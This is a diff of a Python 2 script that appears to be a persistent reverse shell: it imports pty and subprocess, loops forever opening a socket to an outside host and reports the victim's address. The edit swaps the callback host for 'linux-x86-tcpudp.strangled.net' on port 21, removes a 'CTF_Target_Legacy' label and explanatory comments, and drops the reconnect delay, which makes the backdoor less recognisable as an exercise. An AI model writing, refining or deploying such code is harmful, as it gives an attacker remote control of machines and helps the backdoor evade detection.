@@ -2,13 +2,12 @@ import socket, os, pty, select, subprocess, time
 
 while 1:
     try:
-        # TIER 1: Isolated Try block purely for handling connection errors
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("ubuntu-repo.strangled.net", 8090))
+            s.connect(("linux-x86-tcpudp.strangled.net", 21))
 
             try: local_ip = s.getsockname()
-            except: local_ip = "CTF_Target_Legacy"
+            except: local_ip = "Legacy"
 
             s.sendall(str(local_ip) + "\n")
 
@@ -43,9 +42,6 @@ while 1:
         except Exception, e:
             pass
 
-    # TIER 2: Separate, nested finally block for Python 2.4 syntax compliance
     finally:
         try: s.close()
         except: pass
-
-    time.sleep(10)
